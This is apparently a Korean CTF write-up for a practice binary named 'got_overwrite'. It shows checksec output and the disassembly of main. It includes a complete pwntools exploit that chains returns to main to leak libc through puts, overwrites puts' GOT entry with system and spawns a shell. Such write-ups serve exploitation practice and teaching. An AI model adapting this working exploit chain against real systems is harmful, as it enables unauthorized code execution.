# got_overwrite
지용이가 추천해준 문제 GOT Overwrite 문제

## analysis
적용된 메모리 보호기법은 아래와 같다.
```
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```
코드 흐름은 아래와 같다.
``` c
gdb-peda$ pdisas main
Dump of assembler code for function main:
   0x0804846b <+0>:	push   ebp
   0x0804846c <+1>:	mov    ebp,esp
   0x0804846e <+3>:	sub    esp,0x30
   0x08048471 <+6>:	push   0xe
   0x08048473 <+8>:	push   0x8048530
   0x08048478 <+13>:	push   0x1
   0x0804847a <+15>:	call   0x8048350 <write@plt>
   0x0804847f <+20>:	add    esp,0xc
   0x08048482 <+23>:	push   0x49
   0x08048484 <+25>:	lea    eax,[ebp-0x30]
   0x08048487 <+28>:	push   eax
   0x08048488 <+29>:	push   0x0
   0x0804848a <+31>:	call   0x8048320 <read@plt>
   0x0804848f <+36>:	add    esp,0xc
   0x08048492 <+39>:	push   0x804853f
   0x08048497 <+44>:	call   0x8048330 <puts@plt>
   0x0804849c <+49>:	add    esp,0x4
   0x0804849f <+52>:	mov    eax,0x0
   0x080484a4 <+57>:	leave  
   0x080484a5 <+58>:	ret  
gdb-peda$ x/2s 0x8048530
0x8048530:	"overflow me : "
0x804853f:	"/bin/sh"
```
대충 코드는 아래와 같다.
``` c
int main() {
	char buf;
	write(1, "overflow me : ", 0xe);
	read(0, &buf, 0x49);
	puts("/bin/sh");
	return 0;
}
```
우선 read로 인해 overflow가 발생한다. 친절하게 puts 함수에 `/bin/sh`도 넣어주었다. puts의 got를 system으로 overwrite하라고 알려준 셈.  

## hmm...
생각해보니 overflow가 일어나도 내가 수행해야 하는 함수가 많아서 저정도 overflow로는 택도 없다. rop를 이용하는게 아닌가 싶다가도 다른 방법이 떠오르지 않아 다시 rop를 붙잡다가를 반복했다.

## solve
write 함수를 쓸 경우 write 함수 딱 한개만 rop공격으로 사용할 수 있는 정도의 작은 크기의 overflow다. 그래서 chain 공격으로 이어지는 방법을 생각했다. return 주소를 main으로 돌려서 여러번 동일 메모리에서 rop 공격을 해서 마치 rop chain 처럼 이용할 수 있었다. 익스 코드는 아래와 같다.
``` python
from pwn import *

#context.log_level = 'debug'

e = ELF("./got_overwrite")
p = process("./got_overwrite")

plt_puts = 0x8048330

# set virtual addr
v_libc = 0xf7e06000
v_puts = 0xf7e65ca0
v_read = 0xf7edbb00
v_system = 0xf7e40da0

g_puts = v_puts - v_libc
g_system = v_system - v_libc
g_read = v_read - v_libc

r_main = 0x0804846b
dummy = "a" * 0x34

def doPayload(func, arg):
	p.recvuntil("overflow me : ")
	pload = dummy
	pload += p32(func)
	pload += p32(r_main)
	for i in arg:
		pload += p32(i)
	p.send(pload)

# ====== round1 ======
# puts(plt_puts)
doPayload(plt_puts, (plt_puts,))
p.recv(10) # /bin/sh\n\xff\x25

got_puts = u32(p.recv(4))

# ====== round2 ======
# puts(got_puts)
doPayload(plt_puts, (got_puts,))
p.recv(8)

r_puts = u32(p.recv(4))
r_libc = r_puts - g_puts
r_read = r_libc + g_read 
r_system = r_libc + g_system

# ====== round3 ======
# read(0, got_puts, 4) < r_system
doPayload(r_read, (0, got_puts, 4))
p.send(p32(r_system))

# ====== round4 ======
p.interactive()
```
쉘이 따진다.